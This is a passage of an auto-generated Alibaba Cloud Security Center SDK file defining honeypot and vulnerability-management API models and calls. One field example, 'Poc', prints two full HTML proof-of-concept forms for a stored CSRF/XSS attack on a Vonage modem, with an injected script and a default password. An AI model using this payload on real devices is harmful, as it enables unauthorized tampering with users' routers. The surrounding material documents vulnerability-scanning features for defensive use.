  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20'),
  vpcId?: string(name='VpcId', description='The ID of the VPC on which the honeypot is deployed.

> You can call the [DescribeVpcList](~~DescribeVpcList~~) operation to query the IDs of VPCs.', example='vpc-d7o009q63fqy21r8u****'),
  vpcName?: string(name='VpcName', description='The name of the VPC.

> You can call the [DescribeVpcList](~~DescribeVpcList~~) operation to query the names of VPCs.', example='abcnet'),
  vpcRegionId?: string(name='VpcRegionId', description='The region ID of the VPC.

> You can call the [DescribeVpcList](~~DescribeVpcList~~) operation to query the region IDs of VPCs.', example='ap-southeast-2'),
}

model DescribeVpcHoneyPotListResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='2'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='4FEC7F58-FCDA-415F-AE25-CD8BC0931DF2'),
  vpcHoneyPotDTOList?: [ 
    {
      cidrBlock?: string(name='CidrBlock', description='The CIDR block of the VPC.', example='192.168.XX.XX/16'),
      createTime?: long(name='CreateTime', description='The time at which the VPC was created. Unit: milliseconds.', example='1607365213000'),
      honeyPotEcsInstanceStatus?: string(name='HoneyPotEcsInstanceStatus', description='The status of the server on which the honeypot is deployed. Valid values:

*   **Pending**: The server is being created.
*   **Running**: The server is running.
*   **Starting**: The server is being started.
*   **Stopping**: The server is being stopped.
*   **Stopped**: The server is stopped.', example='Running'),
      honeyPotEniInstanceId?: string(name='HoneyPotEniInstanceId', description='The ID of the elastic network interface (ENI) used by the honeypot in the VPC.', example='eni-p0whwgg7bing8b80****'),
      honeyPotExistence?: boolean(name='HoneyPotExistence', description='Indicates whether the cloud honeypot feature is enabled for the VPC. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
      honeyPotInstanceStatus?: string(name='HoneyPotInstanceStatus', description='The status of the honeypot. Valid values:

*   **pending**: The honeypot is being created.
*   **deleting**: The honeypot is being deleted.
*   **off**: The honeypot is disabled.
*   **suspending**: The honeypot is suspended.
*   **on**: The honeypot is enabled.', example='on'),
      honeyPotVpcSwitchId?: string(name='HoneyPotVpcSwitchId', description='The ID of the vSwitch to which the ENI used by the honeypot is connected.', example='vsw-p0w7gdcfvn20tvdul****'),
      vpcId?: string(name='VpcId', description='The ID of the VPC.', example='vpc-p0w223apdl49sr5zv****'),
      vpcName?: string(name='VpcName', description='The name of the VPC.', example='abc-vpcname'),
      vpcRegionId?: string(name='VpcRegionId', description='The region ID of the VPC.

> For more information about the mapping between region IDs and region names, see [Regions and zones](~~40654~~).', example='ap-southeast-2'),
      vpcStatus?: string(name='VpcStatus', description='The status of the VPC. Valid values:

*   **Available**: The VPC is normal and available.
*   **Pending**: The VPC is being configured.', example='Available'),
      vpcSwitchIdList?: [ 
        {
          vpcSwitchId?: string(name='VpcSwitchId', description='The ID of the vSwitch.', example='vsw-p0wdnyv4wzp6jkuu4****'),
          vpcSwitchName?: string(name='VpcSwitchName', description='The name of the vSwitch.', example='abc01'),
          zoneId?: string(name='ZoneId', description='The zone ID of the vSwitch.', example='ap-southeast-2b'),
        }
      ](name='VpcSwitchIdList', description='An array that consists of the vSwitches in the VPC.'),
    }
  ](name='VpcHoneyPotDTOList', description='An array that consists of the honeypots.'),
}

model DescribeVpcHoneyPotListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVpcHoneyPotListResponseBody(name='body'),
}

/**
  * If you specify only the Action request parameter in your request, Security Center returns the list of all VPCs regardless of whether a honeypot is deployed on a VPC.
  *
  * @param request DescribeVpcHoneyPotListRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeVpcHoneyPotListResponse
 */
async function describeVpcHoneyPotListWithOptions(request: DescribeVpcHoneyPotListRequest, runtime: Util.RuntimeOptions): DescribeVpcHoneyPotListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.honeyPotExistence)) {
    query['HoneyPotExistence'] = request.honeyPotExistence;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.vpcId)) {
    query['VpcId'] = request.vpcId;
  }
  if (!Util.isUnset(request.vpcName)) {
    query['VpcName'] = request.vpcName;
  }
  if (!Util.isUnset(request.vpcRegionId)) {
    query['VpcRegionId'] = request.vpcRegionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVpcHoneyPotList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * If you specify only the Action request parameter in your request, Security Center returns the list of all VPCs regardless of whether a honeypot is deployed on a VPC.
  *
  * @param request DescribeVpcHoneyPotListRequest
  * @return DescribeVpcHoneyPotListResponse
 */
async function describeVpcHoneyPotList(request: DescribeVpcHoneyPotListRequest): DescribeVpcHoneyPotListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVpcHoneyPotListWithOptions(request, runtime);
}

model DescribeVpcListResponseBody = {
  count?: int32(name='Count', description='Queries the information about virtual private clouds (VPCs).', example='1'),
  requestId?: string(name='RequestId', description='DescribeVpcList', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
  vpcList?: [ 
    {
      ecsCount?: int32(name='EcsCount', example='9'),
      instanceDesc?: string(name='InstanceDesc', example='TestVpcNote'),
      instanceId?: string(name='InstanceId', example='ins_1321_asedb_ada'),
      instanceName?: string(name='InstanceName', example='test'),
      regionId?: string(name='RegionId', example='cn-hangzhou'),
    }
  ](name='VpcList'),
}

model DescribeVpcListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVpcListResponseBody(name='body'),
}

async function describeVpcListWithOptions(runtime: Util.RuntimeOptions): DescribeVpcListResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeVpcList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVpcList(): DescribeVpcListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVpcListWithOptions(runtime);
}

model DescribeVulCheckTaskStatusDetailRequest {
  taskIds?: [ string ](name='TaskIds'),
  types?: [ string ](name='Types'),
  uuid?: string(name='Uuid', example='5d55af3c-35f3-4d4d-8ccc-8c5443b0****'),
}

model DescribeVulCheckTaskStatusDetailResponseBody = {
  requestId?: string(name='RequestId', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
  taskStatuses?: [ 
    {
      taskId?: string(name='TaskId', example='16190385'),
      taskStatusList?: [ 
        {
          code?: string(name='Code', example='push_command_failed'),
          status?: string(name='Status', example='4'),
          type?: string(name='Type', example='cve'),
        }
      ](name='TaskStatusList'),
    }
  ](name='TaskStatuses'),
  totalCount?: int32(name='TotalCount', example='1'),
}

model DescribeVulCheckTaskStatusDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulCheckTaskStatusDetailResponseBody(name='body'),
}

async function describeVulCheckTaskStatusDetailWithOptions(request: DescribeVulCheckTaskStatusDetailRequest, runtime: Util.RuntimeOptions): DescribeVulCheckTaskStatusDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.taskIds)) {
    query['TaskIds'] = request.taskIds;
  }
  if (!Util.isUnset(request.types)) {
    query['Types'] = request.types;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulCheckTaskStatusDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVulCheckTaskStatusDetail(request: DescribeVulCheckTaskStatusDetailRequest): DescribeVulCheckTaskStatusDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulCheckTaskStatusDetailWithOptions(request, runtime);
}

model DescribeVulConfigRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='113.110.XX.XX'),
  type?: string(name='Type', description='The type of configuration. By default, all types of configurations are queried. Valid values:

*   **cve**: Linux software vulnerability.
*   **sys**: Windows system vulnerability.
*   **cms**: Web-CMS vulnerability.
*   **app**: application vulnerability that is detected by using web scanner.
*   **emg**: urgent vulnerability.
*   **scanMode**: displays easily exploitable vulnerability.
*   **imageVulClean**: vulnerability retention duration.
*   **yum**: preferentially uses YUM or APT sources of Alibaba Cloud to fix vulnerabilities.', example='cve'),
}

model DescribeVulConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
  targetConfigs?: [ 
    {
      config?: string(name='Config', description='The configuration of vulnerability scan.

> Valid values when you set the Type parameter to **cve**, **sys**, **cms**, **app**, **emg**, or **yum**:

*   **on**: enabled

*   **off**: disabled

Valid values when you set the Type parameter to **scanMode**:

*   **real**: displays easily exploitable vulnerability.

*   **all**: displays all vulnerabilities.

When you set the Type parameter to **imageVulClean**, the value of this parameter indicates the vulnerability retention period in days.', example='90'),
      overAllConfig?: string(name='OverAllConfig', description='Indicates whether the vulnerability management feature is enabled for all servers. Valid values:

*   **off**: disabled
*   **on**: enabled', example='on'),
      type?: string(name='Type', description='The type of configuration. Valid values:

*   **cve**: Linux software vulnerability.
*   **sys**: Windows system vulnerability.
*   **cms**: Web-CMS vulnerability.
*   **app**: application vulnerability that is detected by using web scanner.
*   **emg**: urgent vulnerability.
*   **scanMode**: displays easily exploitable vulnerability.
*   **imageVulClean**: vulnerability retention duration.
*   **yum**: preferentially uses YUM or APT sources of Alibaba Cloud to fix vulnerabilities.', example='cve'),
    }
  ](name='TargetConfigs', description='An array that consists of the configurations of vulnerability management.'),
  totalCount?: int32(name='TotalCount', description='The total number of configurations.', example='10'),
}

model DescribeVulConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulConfigResponseBody(name='body'),
}

async function describeVulConfigWithOptions(request: DescribeVulConfigRequest, runtime: Util.RuntimeOptions): DescribeVulConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVulConfig(request: DescribeVulConfigRequest): DescribeVulConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulConfigWithOptions(request, runtime);
}

model DescribeVulDetailsRequest {
  aliasName?: string(name='AliasName', example='RHSA-2019:3197-Important: sudo security update'),
  lang?: string(name='Lang', example='zh'),
  name?: string(name='Name', example='SCA:ACSV-2020-052801'),
  type?: string(name='Type', example='sca'),
}

model DescribeVulDetailsResponseBody = {
  cves?: [ 
    {
      classify?: string(name='Classify', example='remote_code_execution'),
      classifys?: [ 
        {
          classify?: string(name='Classify', example='remote_code_execution'),
          demoVideoUrl?: string(name='DemoVideoUrl', example='https://example.com'),
          description?: string(name='Description'),
        }
      ](name='Classifys'),
      cnvdId?: string(name='CnvdId', example='CNVD-2019-9167'),
      complexity?: string(name='Complexity', example='LOW'),
      content?: string(name='Content', example='Apache Shiro is a user authentication and authorization framework for a wide range of rights management applications.↵Recently, Apache Shiro released version 1.7.0, which fixes the Apache Shiro authentication bypass vulnerability (CVE-2020-17510).↵Attackers can bypass Shiro\\"s authentication using malicious requests containing payloads.↵↵Related bugs:↵CVE-2020-17510 Shiro < 1.7.0 Validation Bypass Vulnerability↵CVE-2020-13933 Shiro < 1.6.0 Validation Bypass Vulnerability↵CVE-2020-11989 Shiro < 1.5.3 Validation Bypass Vulnerability↵CVE-2020-1957 Shiro < 1.5.2 Validation Bypass Vulnerability↵CVE-2016-6802 Shiro < 1.3.2 Validation Bypass Vulnerability
Check whether the fastjson version currently running on the system is in the affected version and whether safeMode is configured to disable autoType. If it is in the affected version and safeMode is not configured to disable autoType, the vulnerability is considered to exist.'),
      cveId?: string(name='CveId', example='CVE-2019-9167'),
      cvssScore?: string(name='CvssScore', example='10.0'),
      cvssVector?: string(name='CvssVector', example='AV:N/AC:L/Au:N/C:C/I:C/A:C'),
      instanceName?: string(name='InstanceName', example='sql-test-001'),
      internetIp?: string(name='InternetIp', example='47.114.XX.XX'),
      intranetIp?: string(name='IntranetIp', example='172.19.XX.XX'),
      poc?: string(name='Poc', example='NewDomain.html
The x and y values will need to be changed accordingly
<html>
<p>Authenticated Stored CSRF/XSS - Vonage Modem</p>
<form method="POST" action="http://192.168.15.1/goform/RgParentalBasic">
<input type="hidden" name="RemoveContentRule" value="0" />
<input type="hidden" name="AddContentRule" value="0" />
<input type="hidden" name="ContentRules" value="0" />
<input type="hidden" name="RuleSelect" value="0" / >
<input type="hidden" name="NewKeyword" value="" / >
<input type="hidden" name="KeywordAction" value="0" />
<input type="hidden" name="NewDomain" value="test\\"><script>alert(1)</script>" />
<input type="hidden" name="x" value="50" />
<input type="hidden" name="y" value="15" />
<input type="hidden" name="DomainAction" value="1" />
<input type="hidden" name="AllowedDomainAction" value="0" />
<input type="hidden" name="ParentalPassword" value="Broadcom" />
<input type="hidden" name="ParentalPasswordReEnter" value="Broadcom" />
<input type="hidden" name="AccessDuration" value="30" />
<input type="submit" title="Exploit" />
</form>
</html>
 
NewKeyword.html
The x and y values will need to be changed accordingly
<html>
<p>Authenticated Stored CSRF/XSS - Vonage Modem</p>
<form method="POST" action="http://192.168.15.1/goform/RgParentalBasic">
<input type="hidden" name="RemoveContentRule" value="0" />
<input type="hidden" name="AddContentRule" value="0" />
<input type="hidden" name="ContentRules" value="0" />
<input type="hidden" name="RuleSelect" value="0" / >
<input type="hidden" name="NewKeyword" value="test\\"><script>alert(1)</script>" / >
<input type="hidden" name="x" value="61" />
<input type="hidden" name="y" value="12" />
<input type="hidden" name="KeywordAction" value="1" />
<input type="hidden" name="NewDomain" value="" />
<input type="hidden" name="DomainAction" value="0" />
<input type="hidden" name="AllowedDomainAction" value="0" />
<input type="hidden" name="ParentalPassword" value="Broadcom" />
<input type="hidden" name="ParentalPasswordReEnter" value="Broadcom" />
<input type="hidden" name="AccessDuration" value="30" />
<input type="submit" title="Enable Service" />
</form>
</html>'),
      pocCreateTime?: long(name='PocCreateTime', example='1554189334000'),
      pocDisclosureTime?: long(name='PocDisclosureTime', example='1554189334000'),
      product?: string(name='Product', example='Log4j2'),
      reference?: string(name='Reference', example='https://example.com'),
      releaseTime?: long(name='ReleaseTime', example='1554189334000'),
      solution?: string(name='Solution', example='<p>At present, Chanjet has urgently released a vulnerability patch to fix the vulnerability. CNVD recommends affected units and users to upgrade to the latest version immediately:</p>↵<p>https://www.chanjetvip.com/product/goods/goods-detail?id=53aaa40295d458e44f5d3ce5</p>↵<p>At the same time, organizations and users affected by the vulnerability are requested to immediately follow the steps below to conduct self-inspection and repair work:</p>↵<ol>↵<li><p>User self-check steps:↵<br  />Check whether website/bin/load.aspx.cdcab7d2.compiled, website/bin/App_Web_load.aspx.cdcab7d2.dll, and tplus/Load.aspx files exist locally. If they exist, it means that they have been poisoned, and you must reinstall the system and install the product. patch.</p>↵</li>↵<li><p>Non-poisoned users please:↵<br  />1) Update the latest product patch.↵<br  />2) Install anti-virus software and update the virus database in time.↵<br  />3) Upgrade the lower version of IIS and Nginx to IIS10.0 and Windows 2016.↵<br  />4) Local installation customers need to confirm whether the backup file is complete as soon as possible, and do off-site backup. Customers on the cloud should enable the mirroring function in time.↵<br  />5) Users who fail to update the patch in time can contact Chanjet technical support and take temporary preventive measures such as deleting files.</p>↵</li>↵<li><p>Poisoned users please:↵<br  />1) Check whether the server has taken regular snapshots or backups. If so, you can restore data through snapshots or backups.↵<br  />2) Contact Chanjet technical support to confirm whether it has the conditions and operation methods to restore data from backup files.</p>↵</li>↵</ol>↵<p>If you have any technical problems, please contact Chanjet technical support: 4006600566-9</p>'),
      summary?: string(name='Summary', example='Chanjet T-Plus is an Internet business management software. There is an unauthorized access vulnerability in one of its interfaces disclosed on the Internet. Attackers can construct malicious requests to upload malicious files to execute arbitrary code and control the server.'),
      targetId?: string(name='TargetId', example='m-bp17m0pc0xprzbwo****'),
      targetName?: string(name='TargetName', example='frontend'),
      title?: string(name='Title', example='Chanjet T-Plus SetupAccount/Upload. Aspx file upload vulnerability(CNVD-2022-60632)'),
      vendor?: string(name='Vendor', example='Apache'),
      vulLevel?: string(name='VulLevel', example='serious'),
    }
  ](name='Cves'),
  requestId?: string(name='RequestId', example='EDA40EA3-6265-5900-AD99-C83E4F109CA8'),
}

model DescribeVulDetailsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulDetailsResponseBody(name='body'),
}

async function describeVulDetailsWithOptions(request: DescribeVulDetailsRequest, runtime: Util.RuntimeOptions): DescribeVulDetailsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliasName)) {
    query['AliasName'] = request.aliasName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulDetails',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVulDetails(request: DescribeVulDetailsRequest): DescribeVulDetailsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulDetailsWithOptions(request, runtime);
}

model DescribeVulExportInfoRequest {
  exportId?: long(name='ExportId', description='The ID of the task.', example='14356'),
}

model DescribeVulExportInfoResponseBody = {
  currentCount?: int32(name='CurrentCount', description='The number of exported entries.', example='1'),
  exportStatus?: string(name='ExportStatus', description='The status of the export task. Valid values:

*   **init**: The task is being initialized.
*   **exporting**: The task is in progress.
*   **success**: The task is complete.', example='success'),
  fileName?: string(name='FileName', description='The name of the exported Excel file.', example='app_20210917'),
  id?: long(name='Id', description='The ID of the task.', example='14356'),
  link?: string(name='Link', description='The URL at which you can download the exported Excel file.', example='http://www.aliyun.com'),
  message?: string(name='Message', description='The message that shows the results of the task. The value is fixed as **success**, which indicates that the task is complete.', example='success'),
  progress?: int32(name='Progress', description='The progress percentage of the task.', example='100'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4C1AE3F3-18FA-4108-BXXX-AFA1A032756C'),
  totalCount?: int32(name='TotalCount', description='The total number of entries in the exported Excel file.', example='10'),
}

model DescribeVulExportInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulExportInfoResponseBody(name='body'),
}

/**
  * If the value of ExportStatus is success, the URL at which you can download the exported Excel file is returned.
  *
  * @param request DescribeVulExportInfoRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeVulExportInfoResponse
 */
async function describeVulExportInfoWithOptions(request: DescribeVulExportInfoRequest, runtime: Util.RuntimeOptions): DescribeVulExportInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.exportId)) {
    query['ExportId'] = request.exportId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulExportInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * If the value of ExportStatus is success, the URL at which you can download the exported Excel file is returned.
  *
  * @param request DescribeVulExportInfoRequest
  * @return DescribeVulExportInfoResponse
 */
async function describeVulExportInfo(request: DescribeVulExportInfoRequest): DescribeVulExportInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulExportInfoWithOptions(request, runtime);
}

model DescribeVulFixStatisticsResponseBody = {
  fixStat?: [ 
    {
      fixedTodayNum?: int32(name='FixedTodayNum', example='10'),
      fixedTotalNum?: int32(name='FixedTotalNum', example='22'),
      fixingNum?: int32(name='FixingNum', example='17'),
      needFixNum?: int32(name='NeedFixNum', example='8'),
      type?: string(name='Type', example='cve'),
    }
  ](name='FixStat'),
  fixTotal?: {
    fixedTodayNum?: int32(name='FixedTodayNum', example='15'),
    fixedTotalNum?: int32(name='FixedTotalNum', example='47'),
    fixingNum?: int32(name='FixingNum', example='22'),
    needFixNum?: int32(name='NeedFixNum', example='62'),
  }(name='FixTotal'),
  requestId?: string(name='RequestId', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
}

model DescribeVulFixStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulFixStatisticsResponseBody(name='body'),
}

async function describeVulFixStatisticsWithOptions(runtime: Util.RuntimeOptions): DescribeVulFixStatisticsResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeVulFixStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVulFixStatistics(): DescribeVulFixStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulFixStatisticsWithOptions(runtime);
}

model DescribeVulListRequest {
  aliasName?: string(name='AliasName', description='The name of the vulnerability.', example='RHSA-2019:0230-Important: polkit security update'),
  attachTypes?: string(name='AttachTypes', description='The additional type of the vulnerabilities. You need to specify this parameter when you query application vulnerabilities. Set the value to **sca**. If you set **Type** to **app**, you must specify this parameter.

> If you set this parameter to **sca**, application vulnerabilities and the vulnerabilities that are detected based on software component analysis are queried. If you do not specify this parameter, only application vulnerabilities are queried.', example='sca'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  dealed?: string(name='Dealed', description='Specifies whether the vulnerabilities are fixed. Valid values:

*   **y**: yes
*   **n**: no', example='n'),
  groupId?: string(name='GroupId', description='The ID of the asset group.

> You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the IDs of asset groups.', example='9207613'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  name?: string(name='Name', description='The alias of the vulnerability.', example='oval:com.redhat.rhsa:def:20172836'),
  necessity?: string(name='Necessity', description='The priority to fix the vulnerability. Separate multiple priorities with commas (,). Valid values:

*   **asap**: high
*   **later**: medium
*   **nntf**: low', example='asap,later,nntf'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='20'),
  remark?: string(name='Remark', description='The remarks for the asset affected by the vulnerability. The value can be the private IP address, public IP address, or name of the asset.', example='1.2.XX.XX'),
  type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **app**: application vulnerability that is detected by using web scanner
*   **emg**: urgent vulnerability
*   **sca**: application vulnerability that is detected by using software component analysis', example='cve'),
  uuids?: string(name='Uuids', description='The UUIDs of the servers on which you want to query the vulnerabilities. Separate multiple UUIDs with commas (,).', example='1587bedb-fdb4-48c4-9330-****'),
  vpcInstanceIds?: string(name='VpcInstanceIds', description='The IDs of the virtual private clouds (VPCs) in which the vulnerability is detected. Separate multiple IDs with commas (,).', example='ins-133****,ins-5414****'),
}

model DescribeVulListResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='2F26AB2A-1075-488F-8472-40E5DB486ACC'),
  totalCount?: int32(name='TotalCount', description='The total number of vulnerabilities returned.', example='2'),
  vulRecords?: [ 
    {
      aliasName?: string(name='AliasName', description='The name of the vulnerability.', example='RHSA-2019:0230-Important: polkit security update'),
      authVersion?: string(name='AuthVersion', description='The edition of Security Center that is authorized to protect the asset. Valid values:

*   **1**: Basic edition
*   **6**: Anti-virus edition
*   **5**: Advanced edition
*   **3**: Enterprise edition
*   **7**: Ultimate edition
*   **10**: Value-added Plan edition', example='3'),
      bind?: boolean(name='Bind', description='Indicates whether Security Center is authorized to protect the asset. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
      extendContentJson?: {
        absolutePath?: string(name='AbsolutePath', description='The package path of the software that has the vulnerability.', example='/roo/www/web'),
        aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='RHSA-2019:0230-Important: polkit security update'),
        description?: string(name='Description', description='The description of the vulnerability.', example='kernel version:5.10.84-10.2.al8.x86_64'),
        ip?: string(name='Ip', description='The public IP address of the asset that is associated with the vulnerability.', example='1.2.XX.XX'),
        lastTs?: long(name='LastTs', description='The timestamp when the vulnerability was last detected. Unit: milliseconds.', example='1620404763000'),
        necessity?: {
          assetsFactor?: string(name='Assets_factor', description='The asset importance score. Valid values:

*   **2**: an important asset
*   **1**: a common asset
*   **0**: a test asset', example='1'),
          cvssFactor?: string(name='Cvss_factor', description='The Common Vulnerability Scoring System (CVSS) score.', example='7.8'),
          enviromentFactor?: string(name='Enviroment_factor', description='The environment score.', example='1.0'),
          isCalc?: string(name='Is_calc', description='Indicates whether the score of urgency to fix a vulnerability is calculated. Valid values:

*   **0**: no
*   **1**: yes', example='1'),
          status?: string(name='Status', description='The status of the score of urgency to fix a vulnerability. Valid values:

*   **none**: No score is generated.
*   **pending**: The score is pending calculation.
*   **normal**: The calculation is normal.', example='normal'),
          timeFactor?: string(name='Time_factor', description='The time score.', example='1.0'),
          totalScore?: string(name='Total_score', description='The score of urgency to fix a vulnerability.

The following list describes scores and related fixing suggestions:

*   If the score is from **13.5 to 15**, the vulnerability is a high-risk vulnerability. You must fix the vulnerability at the earliest opportunity.
*   If the score is **greater than or equal to 7 but less than 13.5**, the vulnerability is a medium-risk vulnerability. You can fix the vulnerability at your convenience.
*   If the score is **less than 7**, the vulnerability is a low-risk vulnerability. You can ignore the vulnerability.', example='7.8'),
        }(name='Necessity', description='Indicates whether the vulnerability needs to be fixed.'),
        os?: string(name='Os', description='The name of the operating system.', example='centos'),
        osRelease?: string(name='OsRelease', description='The release of the operating system.', example='7'),
        primaryId?: long(name='PrimaryId', description='The ID of the vulnerability.', example='111'),
        rpmEntityList?: [ 
          {
            containerName?: string(name='ContainerName', description='The name of the container.', example='k8s_67895c4_xxx'),
            fullVersion?: string(name='FullVersion', description='The complete version number.', example='3.10.0-693.2.2.el7'),
            imageName?: string(name='ImageName', description='The name of the image.', example='registry_387ytb_xxx'),
            matchDetail?: string(name='MatchDetail', description='The reason why the vulnerability is detected.', example='python-perf version less than 0:3.10.0-693.21.1.el7'),
            matchList?: [ string ](name='MatchList', description='The rule that is used to detect the vulnerability.'),
            name?: string(name='Name', description='The name of the RPM package.', example='python-perf'),
            path?: string(name='Path', description='The path of the software that has the vulnerability.', example='/usr/lib64/python2.7/site-packages'),
            pid?: string(name='Pid', description='The process ID.', example='8664'),
            updateCmd?: string(name='UpdateCmd', description='The command that is used to fix the vulnerability.', example='*** update python-perf'),
            version?: string(name='Version', description='The package version number of the software that has the vulnerability.', example='3.10.0'),
          }
        ](name='RpmEntityList', description='The RPM Package Manager (RPM) packages.'),
        status?: string(name='Status', description='The status of the vulnerability. Valid values:

*   **1**: unfixed
*   **2**: fix failed
*   3: rollback failed
*   **4**: fixing
*   **5**: being rolled back
*   **6**: being verified
*   **7**: fixed
*   **8**: fixed and to be restarted
*   **9**: rolled back
*   **10**: ignored
*   **11**: rolled back and to be restarted
*   **12**: not found
*   **20**: expired', example='1'),
        tag?: string(name='Tag', description='The tag that is added to the vulnerability.', example='oval'),
        cveList?: [ string ](name='cveList', description='The CVE list.'),
      }(name='ExtendContentJson', description='The extended information about the vulnerability.'),
      firstTs?: long(name='FirstTs', description='The timestamp when the vulnerability was first detected. Unit: milliseconds.', example='1554189334000'),
      groupId?: int32(name='GroupId', description='The ID of the asset group.', example='281801'),
      instanceId?: string(name='InstanceId', description='The instance ID of the asset.', example='i-bp18t***'),
      instanceName?: string(name='InstanceName', description='The name of the asset.', example='testInstance'),
